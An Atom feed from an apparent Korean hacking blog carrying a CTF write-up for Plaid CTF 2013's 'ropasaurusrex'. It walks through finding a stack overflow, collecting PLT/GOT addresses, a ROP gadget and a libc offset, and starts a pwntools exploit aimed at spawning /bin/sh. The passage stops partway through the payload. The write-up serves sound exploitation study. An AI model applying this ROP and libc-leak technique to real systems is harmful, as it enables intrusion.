<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-10-05T09:16:09+00:00</updated><id>http://localhost:4000/</id><title type="html">eli_ez3r Hacking Blog</title><subtitle>Your Site Description
</subtitle><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><entry><title type="html">[Plaid CTF 2013] ROPasaurusrex</title><link href="http://localhost:4000/2018/09/10/writeup-plaidctf2013-ROPasaurusrex.html" rel="alternate" type="text/html" title="[Plaid CTF 2013] ROPasaurusrex" /><published>2018-09-10T00:00:00+00:00</published><updated>2018-09-10T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/10/writeup-plaidctf2013-ROPasaurusrex</id><content type="html" xml:base="http://localhost:4000/2018/09/10/writeup-plaidctf2013-ROPasaurusrex.html">&lt;h3 id=&quot;0x01-static-analysis&quot;&gt;0x01. Static Analysis&lt;/h3&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/BoB7/study# checksec ropasaurusrex
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/root/Desktop/BoB7/study/ropasaurusrex'&lt;/span&gt;
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x8048000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;바이너리 다운 주소 : http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/
보호기법은 NX만 설정되어 있다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;stack에서 실행 불가능 하다.(쉘코드로 공격 불가능)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/BoB7/study# file ropasaurusrex
ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.18, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;96997aacd6ee7889b99dc156d83c9d205eb58092, stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;dynamic link로 공유라이브러리를 사용하고 있으며, strip되어 있어 심볼이 없다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;0x02-dynamic-analysis&quot;&gt;0x02. Dynamic Analysis&lt;/h3&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;WIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;main함수에는 input함수를 호출하고 return 하는 과정에서 write 함수를 호출한다. (input은 필자가 수정한 이름)&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+10h] [ebp-88h]&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;input함수에는 buf를 선언하고 read함수를 통해 stdin에서 100byte만큼 읽어들여 buf에 저장하는데,&lt;/p&gt;

&lt;p&gt;buf의 크기는 0x88(136)바이트인데, 0x100(256)바이트 만큼 저장하기 때문에 BoF가 발생한다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ssize_t read(int fd, void *buf, size_t nbytes)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd : 파일 디스크립터

void *buf :  파일을 읽어 들일 버퍼

size_t nbytes : 버퍼의 크기

return : 정상적으로 실행되었다면 읽어들인 바이트 수를 리턴, 

			실패시 -1을 반환
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ssize_t write (int fd, const void *buf, size_t n)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd : 파일 디스크립터

void *buf : 파일에 쓰기를 할 내용을 담은 버퍼

size_t n : 쓰기할 바이트 개수

return : 정상적 쓰기를 했다면 쓰기 한 바이트 수, 실패시 -1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;main함수에서 fd값으로 1(stdout), buf값으로 “WIN\n”, size값으로 4를 넣어주었으로 화면에 “WIN”이 출력된다..&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/BoB7/study# ./ropasaurusrex
Hello
WIN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;0x03-prepare-exploit&quot;&gt;0x03. Prepare Exploit&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;BoF취약점을 찾았으므로, read함수를 통해 해당 함수의 ret를 덮을 수 있다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;NT Bit가 설정되어 있으므로 스택에서 쉘코드를 실행 할 수 없다.&lt;/li&gt;
  &lt;li&gt;프로그램 내부에서 system함수를 사용하지 않는다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;위 조건으로 살펴보았을 때, ROP기법으로 문제를 풀어 나가면 될것 같다.&lt;/p&gt;

&lt;p&gt;우리가 알고 있는 것은 read(), write()함수 이므로 두 함수를 이용하여 Libc주소를 leak하고, 그를 이용하여 system함수의 주소를 구해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;system('/bin/sh')&lt;/code&gt;를 실행 시키면 될 것 같다.&lt;/p&gt;

&lt;p&gt;exploit을 하기 위해 필요한 준비물은&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;read@plt 주소&lt;/li&gt;
  &lt;li&gt;read@got 주소&lt;/li&gt;
  &lt;li&gt;write@plt 주소&lt;/li&gt;
  &lt;li&gt;write@got 주소&lt;/li&gt;
  &lt;li&gt;pop-pop-pop-ret 가젯 주소&lt;/li&gt;
  &lt;li&gt;system함수 offset&lt;/li&gt;
  &lt;li&gt;“/bin/sh” 문자열 저장할 주소&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/BoB7/study# gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./ropasaurusrex
Reading symbols from ./ropasaurusrex...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;disas main
No symbol table is loaded.  Use the &lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt; command.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;모든 심볼이 날아갔으므로 &lt;code class=&quot;highlighter-rouge&quot;&gt;disas main&lt;/code&gt; 명령어가 먹히지 않는다. 따라서, 직접 main의 주소를 찾아야 한다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;gdb-peda$ info file
Symbols from &quot;/root/Desktop/BoB7/study/ropasaurusrex&quot;.
Local exec file:
	`/root/Desktop/BoB7/study/ropasaurusrex', file type elf32-i386.
	Entry point: 0x8048340
	0x08048114 - 0x08048127 is .interp
	0x08048128 - 0x08048148 is .note.ABI-tag
	0x08048148 - 0x0804816c is .note.gnu.build-id
	0x0804816c - 0x08048198 is .hash
	0x08048198 - 0x080481b8 is .gnu.hash
	--- 생략 ---
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;gdb 안에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;info file&lt;/code&gt; 명령어를 통해 &lt;strong&gt;Entry point(0x8048340)&lt;/strong&gt;를 알아낸다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;gdb-peda$ x/16i 0x8048340
   0x8048340:	xor    ebp,ebp
   0x8048342:	pop    esi
   0x8048343:	mov    ecx,esp
   0x8048345:	and    esp,0xfffffff0
   0x8048348:	push   eax
   0x8048349:	push   esp
   0x804834a:	push   edx
   0x804834b:	push   0x8048450
   0x8048350:	push   0x8048460
   0x8048355:	push   ecx
   0x8048356:	push   esi
   0x8048357:	push   0x804841d
   0x804835c:	call   0x804831c &amp;lt;__libc_start_main@plt&amp;gt;
   0x8048361:	hlt
   0x8048362:	nop
   0x8048363:	nop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entry point에  instruction 을 보면 &lt;strong&gt;_libc_start_main@plt&lt;/strong&gt; 를 호출하는 함수가 보인다.&lt;/p&gt;

&lt;p&gt;이때 들어가는 &lt;strong&gt;마지막 push 값(“0x804841d”)&lt;/strong&gt; 이 main함수의 주소가 된다.&lt;/p&gt;

&lt;p&gt;main : 0x0804841d&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;gdb-peda$ x/16i 0x804841d
   0x804841d:	push   ebp
   0x804841e:	mov    ebp,esp
   0x8048420:	and    esp,0xfffffff0
   0x8048423:	sub    esp,0x10
   0x8048426:	call   0x80483f4
   0x804842b:	mov    DWORD PTR [esp+0x8],0x4
   0x8048433:	mov    DWORD PTR [esp+0x4],0x8048510
   0x804843b:	mov    DWORD PTR [esp],0x1
   0x8048442:	call   0x804830c &amp;lt;write@plt&amp;gt;
   0x8048447:	leave
   0x8048448:	ret
&lt;/code&gt;&lt;/pre&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;WIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;소스코드와 비교하여 봤을 때, main함수에서 첫번째로 call 하는 곳이 input함수,  두번째가 write@plt가 된다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;write@plt : 0x804830c&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;write@plt를 따라가보면&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;gdb-peda$ x/3i 0x804830c
   0x804830c &amp;lt;write@plt&amp;gt;:	jmp    DWORD PTR ds:0x8049614
   0x8048312 &amp;lt;write@plt+6&amp;gt;:	push   0x8
   0x8048317 &amp;lt;write@plt+11&amp;gt;:	jmp    0x80482ec
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;write@plt에서 jmp하는 주소가 write@got주소가 된다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;write@got : 0x8049614&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;gdb-peda$ x/32i 0x080483f4
   0x80483f4:	push   ebp
   0x80483f5:	mov    ebp,esp
   0x80483f7:	sub    esp,0x98
   0x80483fd:	mov    DWORD PTR [esp+0x8],0x100
   0x8048405:	lea    eax,[ebp-0x88]
   0x804840b:	mov    DWORD PTR [esp+0x4],eax
   0x804840f:	mov    DWORD PTR [esp],0x0
   0x8048416:	call   0x804832c &amp;lt;read@plt&amp;gt;
   0x804841b:	leave
   0x804841c:	ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;input 함수 내부이다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;read@plt : 0x804832c&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;gdb-peda$ x/3i 0x804832c
   0x804832c &amp;lt;read@plt&amp;gt;:	jmp    DWORD PTR ds:0x804961c
   0x8048332 &amp;lt;read@plt+6&amp;gt;:	push   0x18
   0x8048337 &amp;lt;read@plt+11&amp;gt;:	jmp    0x80482ec
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;read@got : 0x804961c&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;이제 “/bin/sh” 문자열을 넣을 공간을 찾아야 하는데, 제일 만만한 곳이 bss영역이다.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu  ~/study# objdump &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; ropasaurusrex | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;bss
 24 .bss          00000008  08049628  08049628  00000628  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bss주소 : 0x08049628&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;위에서 구한것들을 정리해보면,&lt;/p&gt;

&lt;p&gt;write@plt : 0x804830c&lt;/p&gt;

&lt;p&gt;write@got : 0x8049614&lt;/p&gt;

&lt;p&gt;read@plt : 0x804832c&lt;/p&gt;

&lt;p&gt;read@got : 0x804961c&lt;/p&gt;

&lt;p&gt;bss주소 : 0x08049628&lt;/p&gt;

&lt;p&gt;위 정보를 다른 방법으로 구하는 방법.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826231757695.png&quot; alt=&quot;Image&quot; class=&quot;rounded shadow&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이제 pop-pop-pop-ret 가젯만 구하면 된다.&lt;/p&gt;

&lt;p&gt;ropper를 이용하여 가젯을 구하면 쉽지만, ropper가 없는 환경 일 수 있으니 objdump로 구하는 방법을 소개하겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826231705197.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위에서 나온 가젯들 중 pop-pop-pop-ret이 연속적인 주소로 된 것을 고르면 된다.&lt;/p&gt;

&lt;p&gt;0x080484b6를 사용하면 될 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826231440053.png&quot; alt=&quot;&amp;quot;ropper는 좀 더 이쁘게보여진다&amp;quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ropper는 좀 더 이뿌게 보여진다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;0x04-exploit&quot;&gt;0x04 Exploit&lt;/h3&gt;

&lt;p&gt;먼저 생각해야 할 점은 Libc의 주소를 leak해야 하며, 이유는 system함수의 주소를 구하기 위함이다.&lt;/p&gt;

&lt;p&gt;Libc에 주소를 구하는 방법은 여러가지 방법이 있겠다.&lt;/p&gt;

&lt;p&gt;예를들어서 read함수의 주소를 구하고, 거기서 read함수의 offset을 빼면 Libc의 주소가 나온다.&lt;/p&gt;

&lt;p&gt;그리고 Libc주소에 system함수의 offset을 더하면 system함수의 주소가 된다.&lt;/p&gt;

&lt;p&gt;즉 코드로 설명하면&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;또 다른 방법은 read주소와 system주소의 차이를 구한다.&lt;/p&gt;

&lt;p&gt;그리고 read함수의 주소를 leak하고 그 차이를 더하거나 빼면 system함수가 주소가 된다.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p system
&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0xf7e40da0 &amp;lt;system&amp;gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0xf7edbb00 &amp;lt;&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p/x 0xf7edbb00 - 0xf7e40da0
&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x9ad60
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9ad60&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;어떤 방법을 사용하던 편한 것으로 사용하면된다.&lt;/p&gt;

&lt;p&gt;필자는 2번째 방법을 사용하였다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./ropasaurusrex&quot;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# prepare to exploit
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x804832c&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;read_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x804961c&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x804830c&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8049614&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;read_system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9ad60&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dummy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pppr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x080484b6&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;binsh_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#p = remote(&quot;localhost&quot;, 7777)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# BoF
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# read read_got leak
